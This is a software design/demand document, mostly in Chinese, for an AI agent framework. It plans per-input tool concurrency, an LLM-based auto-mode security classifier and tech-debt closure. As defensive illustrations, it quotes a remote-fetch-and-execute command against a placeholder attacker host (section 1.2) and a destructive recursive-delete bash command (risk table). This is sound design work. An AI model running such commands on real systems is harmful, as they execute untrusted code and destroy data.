# Demand: DM-20260702-009 — D2 Tool Input-Aware Concurrency + Auto-Mode Security Classifier + Tech-Debt Closure

**Demand ID:** DM-20260702-009
**Created:** 2026-07-02
**Priority:** P1
**Source:** 复盘 DM-20260702-008 P1 延期 (9 T) + DM-20260701-007 借鉴关系 10 项 + openspec/tech-debt/streaming-tool-executor-v2.md (TD-STE-01~06) + clawcode Tool interface 35 字段 (doc 53) + 复盘清单 6 项审计 → **13 T 点全纳入**

---

## 1. 问题陈述 (复盘 DM-20260702-008 P1)

DM-20260702-008 (Token Design 2.0, PR #376 已合并) 在 16 P0 T 点全量 IMPLEMENTED 后, 把 9 P1 T 点 (T16-T24) 明确延期到本 change. 复盘发现 2 个**未根治的次治本问题**:

### 1.1 根因 1 (RC-1): `ConcurrencySafe bool` 是 v2 静态字段, 不是 per-input 决策

devrix 现状 (`internal/shared/contracts/tool_surface.go:39-43`):

```go
// ConcurrencySafe: multiple invocations of the same tool may run in parallel
// without mutual interference (e.g. read_file on different paths).
ConcurrencySafe bool
```

- **问题**: 静态 bool, **per-tool**, 不知道具体 input
  - `bash` 永远 `ConcurrencySafe=false` (因为能 `rm -rf`), 但 `bash` 跑 `ls -la` 完全可以并发
  - `read_file` 永远 `ConcurrencySafe=true`, 但 read_file 一个 1GB 文件 8K 截断会触发 8 次串行, 浪费并发
- **后果**:
  - turn_adapter.ExecuteRound (`turn_adapter.go:277`) 拿静态 bool 决策并发/串行, **过度保守**, N 个 read_file 全串行
  - 9 个并发 read_file 任务全串行执行, 50 文件 review 从 9×1s 退化成 9×1s (而非 ~1s 并发)
- **vs clawcode**: `Tool.isConcurrencySafe(input: z.infer<Input>): boolean` 是 **per-input 函数** (`src/Tool.ts:402`), bash 自己判断 read-only command 可并发; `src/services/tools/toolOrchestration.ts:84-118` 的 `partitionToolCalls` 把 isConcurrencySafe=true 的连续 tool_use 放进同一个 batch 并发执行

### 1.2 根因 2 (RC-2): 无 auto-mode 安全分类器, 缺中间层防御

devrix 现状: 缺 `Tool.toAutoClassifierInput(input)` + auto-mode classifier 整条链路

- **问题**:
  - Verify 节点 (`executionflow/verify/`) 是**事后**验证 (任务完成后)
  - 第一道安全是 `surface.CheckPermission` (D7-S10-A50 VerifyContract 的 4 元组) — **事前**静态规则
  - **没有中间层**: 工具调用**执行前 + 静态规则后**, 缺一个 LLM-driven 智能检查 (类似 `claude --dangerously-skip-permissions` 的 YOLO 模式)
- **后果**:
  - 静态规则漏掉的攻击 (e.g. `bash` 跑看似无害的 `curl evil.com | sh`, 静态规则因 `curl` 在白名单放行) 直接执行, 后果不可逆
  - LLM 没有"二次安全"机会 — Verify 节点是事后, 改不了已执行的命令
- **vs clawcode**:
  - `Tool.toAutoClassifierInput(input)` (`src/Tool.ts:556`): 返回紧凑 string (e.g. `ls -la` for Bash, `/tmp/x: new content` for Edit) — 不暴露整个 transcript
  - `src/utils/permissions/yoloClassifier.ts:378-410` 的 `toCompactBlock`: 整个 transcript 序列化为 JSONL 喂给独立 LLM (SideQuery) 判 `allow` / `deny`
  - 失败时 fail-safe: `toAutoClassifierInput` 抛错 → 落 raw input + log `tengu_auto_mode_malformed_tool_input`

### 1.3 借鉴关系表

| 项 | devrix 现状 | clawcode 真实做法 | 差距 |
|----|------------|------------------|------|
| 并发决策粒度 | per-tool 静态 bool | per-input 函数 (含 input) | 过度保守 |
| Bash 安全并发 | 不支持 (Bash 永远 false) | isConcurrencySafe(input) = isReadOnly(input) | 浪费并发 |
| 失败处理 | n/a (静态) | try-catch → 保守 false | 缺 fail-safe |
| 安全分类器 | 无 | yoloClassifier (SideQuery LLM) | 缺中间层 |
| Tool 投影 | 无 | toAutoClassifierInput (per-tool) | transcript 太重 |
| Transcript 序列化 | 无 | toCompactBlock JSONL | 直接喂 LLM 不可行 |
| 失败 telemetry | 无 | `tengu_auto_mode_malformed_tool_input` | 缺观测 |
| 复用 ToolUseContext | 无 | sideQuery 复用 context | 缺基础设施 |

### 1.4 保留 devrix 创新 (clawcode 缺)

- **EmissionClass 4 类路由** (Fact/Action/Probe/Experiment) — 架构性创新
- **VerifyContract 4 元组 (Burden × Class × Discipline × Outcome)** — 创新, 第一道安全
- **MUPS 5 节点 × 4 类正交分解** — 架构性创新
- **Learn FeedbackMemory (H7 reputation)** — 创新
- **LTL-Lite L4-L6 (advisory)** — 创新
- **Token Design 2.0 (PersistToFile + offset/limit + per-message 200K)** — 创新 (P0 已落地)
- **task_kind 推 Filter v2** — 创新
- **ConvergenceContract / IterationBound / SourceUncertainty 4 control plane** — 创新 (P0 已落地)

### 1.5 复盘清单 (2026-07-02 审计) — 6 项吸收到本 change

复盘之前 discussion 留下的 6 项未实现项, 全部吸收进本 change (T25-T28 4 个新 T 点 + 2 项 tech-debt 关闭):

| # | 项 | 原状态 | 吸收路径 |
|---|----|--------|----------|
| 1 | **GrowthBook runtime override** | DM-20260702-008 借鉴关系 #8 标 P2, 未归任何 change | **T25 GrowthBook flag 集成** (per-tool 阈值 + classifier + concurrency 都可接, 默认关闭) |
| 2 | **TD-STE-01 混合批次并发** | openspec/tech-debt/streaming-tool-executor-v2.md P1, 未关 | **T18 partitionToolCalls 显式 close** (batch 间串行 + batch 内并发) |
| 3 | **TD-STE-06 ConcurrencySafe 注册表** | tech-debt P2, 未关 | **T16-T17 显式 close** (per-input `IsConcurrencySafe` + 19 工具 surface 默认) |
| 4 | **TD-STE-02 Bash sibling abort** | tech-debt P1, 未归任何 change | **T26 BashTool abort 兄弟并行 + synthetic tool_result** |
| 5 | **TD-STE-03 discard on fallback** | tech-debt P1, 未归任何 change | **T27 StreamingToolExecutor.Discard()** (依赖 TD-QL-03 已 CLOSED) |
| 6 | **clawcode Tool.inputsEquivalent** | 35 字段中未在 devrix 落地的字段, 跟 ContentReplacementState 联动 | **T28 inputsEquivalent** (cache invalidation 收口) |

---

## 2. 目标

### 2.1 治本目标 (per-input 决策 + 智能中间层)

| 目标 | 衡量 | 现状 | 目标 |
|------|------|------|------|
| Bash 只读可并发 | N 并发 `git status` 延迟 | 全串行 (9×1s) | 1×1s (1 batch) |
| Read 并发粒度 | N 并发 `read_file` 延迟 | 全串行 | 1 batch 并发 |
| Fail-safe | `isConcurrencySafe` 抛错时 | n/a | 保守 false (不并发) |
| 工具投影 | `toAutoClassifierInput` 覆盖率 | 0/19 | 19/19 全覆盖 |
| Auto-mode classifier | 中间层防御 | 无 | LLM SideQuery + 5s timeout |
| 失败 telemetry | `auto_mode_malformed_tool_input` 事件 | 0 | ≥1 per 异常 |
| 端到端 e2e | 50 文件 review 用并发 (clawcode `partitionToolCalls`) | 串行 ~150 calls 串行 | ~30 batches 并发 |

### 2.2 保留目标 (P0 已落地的 16 T 不动)

- Token Design 2.0 (PersistToFile + offset/limit + per-message 200K)
- ToolSpec v3 6 control plane 字段 (EmissionClass / ConvergenceContract / IterationBound / SourceUncertainty / MaxResultSizeChars / TruncateMarkerText)
- VerifyContract 4 元组 (第一道安全, 不动)
- EmissionClass 4 类路由 (不动)
- task_kind 推 Filter v2 (不动)
- Learn FeedbackMemory (不动)
- LTL-Lite L4-L6 advisory (不动)
- MUPS 5 节点 × 4 类正交分解 (不动)

### 2.3 不在本次目标 (走下个 change)

- Transcript 完整 LLM 上下文 (10+ 工具全 transcript) — P2
- 多 LLM ensemble (ensemble classifier) — P3
- 跨 session reputation → classifier input — P2 (跟 Learn FeedbackMemory 联动)
- Classifier-driven microcompact (T13 PerMessageBudget 联动) — P2
- Bash 22 zsh rules 改造 (DM-20260701-007 OOS-7 弱相关) — 域自治
- D1/D3/D4/D6 域元数据 (DM-20260701-007 OOS-8) — 域自治

---

## 3. 验收标准

| ID | 标准 | 优先级 | 验证 |
|----|------|--------|------|
| AC1 | `ToolSurface` 加 `IsConcurrencySafe(input []byte) bool` 方法, 19 工具全部默认实现 (per-input 决策) | P0 | 19 工具 surface_test PASS |
| AC2 | `ToolSurface` 加 `ToAutoClassifierInput(input []byte) string` 方法, 19 工具全部默认实现 | P0 | 19 工具 surface_test PASS |
| AC3 | `ChannelRouter.ExecuteRound` (`turn_adapter.go:277`) 改造为 `partitionToolCalls`-style: 把 `IsConcurrencySafe=true` 的连续 tool_call 放进同 batch, batch 内并发, batch 间串行 | P0 | 50 文件 e2e: 50 read_file 拆成 ~10 batch, 总延迟 < 串行 / 5 |
| AC4 | **[R3→P2 stub]** `AutoModeClassifier` interface 契约 (`internal/layers/orchestration/decisionplanning/auto_classifier.go`): 定义 `Classify(ctx, transcript) (Result, error)` + panic-on-unimplemented stub (T22', 不接真 SideQuery) | P2 | `classifier_stub_test`: 契约存在 + stub panic 信息明确 (含 "P2 interface, not implemented") |
| AC5 | **[R3→P2 stub]** `auto_mode.malformed_tool_input` metric stub 编译存在 (不实际触发, 等 P1 classifier 实施后激活) | P2 | 编译验证 |
| AC6 | Fail-safe: `IsConcurrencySafe` 抛错时保守 false (不并发); `ToAutoClassifierInput` 抛错时落 raw input + emit metric | P0 | 2 单测 |
| AC7 | Bash 工具: `isReadOnly(input) → IsConcurrencySafe(input) = true` (镜像 clawcode `BashTool.tsx:434-437`) | P0 | bash_runner_test |
| AC8 | 19 工具 default ToAutoClassifierInput 走 registered surface 而非 hardcoded fallback (避免 silent default) | P0 | surface_metadata_gate_test 加 1 case |
| AC9 | 12 T 点 (R3 收敛: T16-T21 + T22'-T23' + T24'-T25' + T26-T28) 全 IMPLEMENTED, 走 D2-S15-A02 + D7-S9-A50 + D7-S10-A50 + D7-S11-A50 t-registry | P0 | t-registry + tasks.md |
| AC10 | 端到端 e2e: 50 文件 review + 9 并发 read_file batch, 任务完成时间 < 串行 / 3 | P0 | review50_e2e_test.go 加并发版本 |
| AC11 | **GrowthBook override** — 19 工具 per-tool 阈值 + Classifier enable + ConcurrencySafe 全部可走 GrowthBook feature flag 运行时调, 默认全关 | P0 | growthbook_override_test + 19 工具 default + Production-Safety |
| AC12 | **Bash sibling abort** — 并行 Bash 中一个失败, 兄弟 Bash 通过 `siblingAbortController` abort + 返 synthetic `Cancelled: parallel tool call errored` tool_result | P1 | bash_sibling_abort_test (mock 双 Bash, 第一个 error → 第二个 cancelled) |
| AC13 | **Discard on fallback** — QueryLoop fallback model 切换前调 `StreamingToolExecutor.Discard()`, 在途/queued 工具注入 `streaming_fallback` synthetic result | P1 | discard_test (fallback 路径无 orphan tool_use) — 依赖 TD-QL-03 已 CLOSED |
| AC14 | **inputsEquivalent(a, b)** — 19 工具 surface 加 `inputsEquivalent(a, b []byte) bool` 默认实现, 配合 ContentReplacementState (T04) 实现 cache invalidation 收口 | P2 | inputs_equivalent_test (19 工具 × 3 case = 57 单测) |
| AC15 | **partition 结果完整性** — M 个 tool_call 输入 → 恰好 M 个 tool_result 输出, 每个 result 的 `tool_use_id` 与原始 call 一一对应 (无 drop/dup), 且重组后顺序与原始索引一致 (batch 内乱序完成不影响输出顺序) | P0 | `partition_invariants_test`: batch 内 3 call 逆序返回 → 重组后顺序 + id + 计数正确 |
| AC16 | **交错保序拆分** — `[safe, unsafe, safe, safe]` 序列 → `[safe][unsafe][safe,safe]` 3 batch, 不跨 unsafe 合并两个 safe 组, 保持原序 | P0 | `partition_invariants_test` (交错序列 case) |
| AC17 | **read-only batch 部分失败** — read batch 中 1 个失败, 其余照常完成 + 全部 result 返回 (不 abort 兄弟, 区别于 AC12 bash abort 语义) | P0 | `partition_invariants_test` (read-only 部分失败 case) |
| AC18 | **read_file size 无关** — `read_file.IsConcurrencySafe` 忽略 input size, 恒 true (锁 8K anti-pattern 回归) | P0 | `read_file` surface_test: 大/小 input 均 true |
| AC19 | **panic 隔离** — partition batch 内单个 tool goroutine panic, 经 L4 fail-safe wrapper (design.md:468) 转 error tool_result, 不污染兄弟 goroutine / 不崩 ExecuteRound | P0 | `partition_invariants_test` (panic 隔离 case) |
| AC20 | **并发上限 enforcement** — batch 内并发受 `maxConcurrency` 上限约束 (errgroup.SetLimit / semaphore), 50 全 safe 不 spawn 50 goroutine | P1 | `partition_invariants_test`: 50 safe call, 峰值活跃 goroutine ≤ 上限 |
| AC21 | **ctx 取消清理** — turn ctx 中途 cancel, 在途 batch goroutine 全部退出无泄漏 | P1 | `partition_invariants_test` (goleak + -race) |

---

## 4. 依赖与约束

| 类型 | 内容 |
|------|------|
| **上游依赖** | DM-20260702-008 (Token Design 2.0 已合) 提供 PersistToFile 持久化 (本 change 的 SideQuery transcript 可用 PersistToFile 兜底) |
| **上游依赖** | DM-20260701-007 (MUPS ToolSpec v3) 提供 6 control plane 字段 (本 change 的 `IsConcurrencySafe`/`ToAutoClassifierInput` 是 ToolSurface interface 新方法, 不冲突) |
| **上游依赖** | DM-20260618-001 (Tool Spec v2) 提供 9 字段基线 (本 change 扩展 surface interface, 0 break) |
| **上游依赖** | `Learn FeedbackMemory` (DM-20260701-007 P1) 提供 reputation data (本 change 暂不联动, P2 走) |
| **约束** | ToolSpec v3 struct 不能加新字段 (会 break 9 → 15 字段的命名约定), 新方法必须走 `ToolSurface` interface, 不进 ToolSpec |
| **约束** | `IsConcurrencySafe` 必须 fail-safe (抛错 → false, 不并发), 不能 panic 上抛到 ExecuteRound |
| **约束** | `ToAutoClassifierInput` 抛错 → log metric + 落 raw input, 不能 panic 上抛 |
| **约束** | 13 T 点 (T16-T28) = 10 项 P0 (T16-T25) + 2 项 P1 (T26/T27) + 1 项 P2 (T28), P0 全 P0 验收 (符合 P0 阻断条件) |
| **约束** | Classifier LLM SideQuery 5s timeout (硬上限, 不可改) |
| **约束** | 0 业务代码 out-of-scope diff (跟 Token Design 2.0 收口 PR #376 同样的纪律) |
| **约束** | T26 Bash sibling abort 不能 abort 父 QueryLoop turn, 只 abort 同 batch 兄弟 |
| **约束** | T27 discard on fallback 依赖 TD-QL-03 (已 CLOSED, DM-20260618-010), 不依赖未关闭的 tech-debt |
| **约束** | T25 GrowthBook 默认全关, Production-Safety: 不能在未 flag 开启时影响用户行为 |

---

## 5. 变更范围

### 5.1 新增 (新建)

- `internal/shared/contracts/tool_surface_v4.go` (interface 扩展方法)
- `internal/layers/orchestration/decisionplanning/auto_classifier.go` (新建 classifier)
- `internal/layers/orchestration/decisionplanning/auto_classifier_test.go` (7+ 单测)
- `internal/layers/orchestration/decisionplanning/to_compact_block.go` (JSONL transcript 序列化)
- `internal/layers/orchestration/decisionplanning/to_compact_block_test.go`
- `internal/layers/bootstrap/turn_adapter_partition_test.go` (50 文件 e2e 并发版本)
- `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_v2.go` (per-tool IsConcurrencySafe/ToAutoClassifierInput 19 工具默认)
- `internal/layers/observability/instrument/growthbook/` (新建, GrowthBook override registry)
- `internal/layers/observability/instrument/growthbook/persist_threshold_override.go` (T04 ContentReplacementState GrowthBook 联动)
- `internal/layers/observability/instrument/growthbook/concurrency_override.go` (T16-T17 IsConcurrencySafe GrowthBook 联动)
- `internal/layers/observability/instrument/growthbook/classifier_override.go` (T22-T23 AutoModeClassifier GrowthBook 联动)
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` (T26 BashTool abort 兄弟并行)
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort_test.go`
- `internal/bootstrap/discard_on_fallback.go` (T27 StreamingToolExecutor.Discard())
- `internal/bootstrap/discard_on_fallback_test.go`
- `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent.go` (T28 per-tool inputsEquivalent 默认)
- `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent_test.go` (19 工具 × 3 case)

### 5.2 修改 (扩展)

- `internal/layers/contextengine/enforce/tools/surface/*.go` — 19 surface 加 `IsConcurrencySafe` / `ToAutoClassifierInput` / `inputsEquivalent` 默认实现
- `internal/bootstrap/turn_adapter.go:277` — `ExecuteRound` 改造为 `partitionToolCalls`-style batch
- `internal/layers/contextengine/enforce/tools/surface/surface_metadata_gate_test.go` — 加 AC8 case
- `internal/layers/orchestration/decisionplanning/classifier.go` — `IntentClassifier` 加 `ClassifyToolUse(transcript, sideQuery) YoloResult` 方法
- `internal/layers/contextengine/enforce/tools/bash/bash_runner.go` — `BashTool` 集成 `siblingAbortController` (T26)
- `internal/bootstrap/streaming_executor.go` (新建) — `Discard()` 方法 + fallback 路径 wiring (T27)
- `openspec/tech-debt/streaming-tool-executor-v2.md` — TD-STE-01/02/03/06 closed-by 标注
- `openspec/specs/d2-context-engine/t-registry.md` — D2-S15-A02-T16..T28 注册
- `openspec/specs/d7-orchestration/t-registry.md` — D7-S9-A50-T16..T19 + D7-S10-A50-T20..T24 + 新 T26-T28 注册
- `openspec/specs/d3-llm-gateway/t-registry.md` — D3-S3-A01 SideQuery 5s timeout + retry + budget 注册
- `openspec/t-registry.md` — v5.15.0 主索引 +13 T

### 5.3 不变更 (0 业务代码 out-of-scope diff 原则)

- ToolSpec v3 struct (6 control plane 字段不动, 0 break)
- 已合入 P0 T01-T15 + T25-T28 (Token Design 2.0 16 T 全保留)
- EmissionClass 4 类路由 (不动)
- VerifyContract 4 元组 (第一道安全, 不动)
- MUPS 5 节点 × 4 类正交分解 (不动)

---

## 6. 风险评估

| 风险 | 影响 | 缓解 |
|------|------|------|
| Bash `isReadOnly` 误判 (e.g. `bash -c "ls; rm -rf /"`) 触发并发 | 高 — 误把 destructive bash 标并发 | `BashTool.isReadOnly` 必须 parse 整个 command tree (仿 clawcode parseForSecurity), 不可靠时保守 false |
| `IsConcurrencySafe` 抛错 → panic 上抛到 ExecuteRound | 高 — turn 崩溃 | fail-safe: catch + log metric + return false, 已 AC6 覆盖 |
| Auto-mode classifier LLM 幻觉 (返 allow 但实际 deny) | 中 — 安全漏判 | 5s timeout 硬上限 + 不替换 VerifyContract 4 元组 (它是 ground truth) + auto-mode 默认关闭 (P2 再开) |
| `ToAutoClassifierInput` 抛错 → 上抛, ExecuteRound 中断 | 中 — turn 崩溃 | fail-safe: catch + emit metric + fall back to raw input (AC6) |
| Bash `parseForSecurity` 性能 (每 tool_call 都 parse) | 低 — 单 turn 几 ms | 缓存 parse 结果 (per toolUseID) + 拒绝超长 command (>10K chars) |
| SideQuery LLM 不可用 (网络/CK) | 中 — auto-mode 失能 | 5s timeout 后默认 allow (fail-open) + metric `auto_mode.classifier_unavailable` + 不替换 VerifyContract |
| 19 工具 surface 改 IsConcurrencySafe 默认 → 破坏现有并发行为 | 中 — 现有 turn 变串行 | AC1 强制 19 工具默认保持 v2 的 `ConcurrencySafe` 行为, per-input 只在显式 override 时生效 |
| transcript 序列化 leak 隐私 (含 user message, file content) | 中 — PII 风险 | toCompactBlock 只投影 tool_use 块, 不投影 tool_result 内容, 跟 clawcode 一致 |

---

## 7. 关联需求

### 7.1 Supersede (narrow)

- 无 (本 change 是增量, 不撤回任何已合 P0 T)

### 7.2 Related (上游 — 已合)

- DM-20260702-008 (Token Design 2.0) — 提供 PersistToFile (classifier transcript 可用)
- DM-20260701-007 (MUPS ToolSpec v3) — 提供 6 control plane 字段 (不冲突, 本 change 加 ToolSurface interface 新方法)
- DM-20260618-001 (Tool Spec v2) — 提供 9 字段基线 (v4 加 interface 方法, 0 break)
- DM-20260618-002 (Surface Permission Extension) — VerifyContract 4 元组 (本 change 第二道安全, 跟 auto-mode 互补)
- DM-20260618-003 (Surface Lazy Loading) — DeferLoading (不冲突)

### 7.3 Related (前置)

- DM-20260629-001 (D7 DSAFT restructuring) — Span Evidence 100%
- DM-20260625-019 (D7 5-node coverage) — MUPS Phase 3 PR-C1 跨域类型
- DM-20260626-005 (D7 6S Verify promotion) — executionflow/verify/ 物理 promote

### 7.4 Related (下游 — 走 P2/P3 后续 change)

> OOS 编号 OOS-NEW-1~10 (跟 tasks.md + proposal.md 同步), 原 OOS-1 (GrowthBook 走 T25) + TD-STE-01/02/03/06 (4 项 tech-debt 关闭) + inputsEquivalent (走 T28) 已吸收到本 change.

- OOS-NEW-1: Transcript 完整 LLM 上下文 (10+ 工具全 transcript) — P2
- OOS-NEW-2: 多 LLM ensemble (ensemble classifier) — P3
- OOS-NEW-3: 跨 session reputation → classifier input — P2
- OOS-NEW-4: Classifier-driven microcompact (T13 PerMessageBudget 联动) — P2
- OOS-NEW-5: LLM SideQuery 模型选择 (Haiku vs Sonnet) — P2
- OOS-NEW-6: YoloClassifier telemetry 跟 Learn FeedbackMemory 联动 — P2
- OOS-NEW-7: 工具 progress 流 (TD-STE-04) — P2
- OOS-NEW-8: synthetic error 统一 (TD-STE-05) — P2
- OOS-NEW-9: Bash 22 zsh rules 改造 (DM-20260701-007 OOS-7 弱相关) — 域自治
- OOS-NEW-10: Filter v2 workspace 维 (DM-20260701-007 OOS-10) — 走 P1 独立 change

---

## 8. 路线图 (6 PR 收口)

| PR | 范围 | T 点 | AC | tech-debt closed | 估时 |
|----|------|------|-----|------------------|------|
| **PR-A** | `ToolSurface` interface v4 + 19 工具 `IsConcurrencySafe` 默认实现 | T16-T17 | AC1/AC2/AC8 | TD-STE-06 | W1 D1-D2 |
| **PR-B** | `ExecuteRound` partitionToolCalls 改造 + 50 文件 e2e 并发版 | T18-T19 | AC3/AC10 | TD-STE-01 | W1 D3-D5 |
| **PR-C** | `ToAutoClassifierInput` + 19 工具默认实现 | T20-T21 | AC2/AC4 | — | W2 D1-D2 |
| **PR-D** | Auto-mode classifier + toCompactBlock + ChannelRouter 集成 | T22-T23 | AC4/AC5/AC6/AC7 | — | W2 D3-D4 |
| **PR-E** | Classifier 测试 + telemetry + 端到端 e2e | T24 | AC1-AC10 | — | W2 D5 |
| **PR-F** | GrowthBook override + Bash sibling abort + Discard on fallback + inputsEquivalent | T25-T28 | AC11/AC12/AC13/AC14 | TD-STE-02 + TD-STE-03 | W3 D1-D2 |
| **合计** | 6 PR squash merge | 13 T + 14 AC | — | 4 tech-debt | 1 周 + 2 天 |
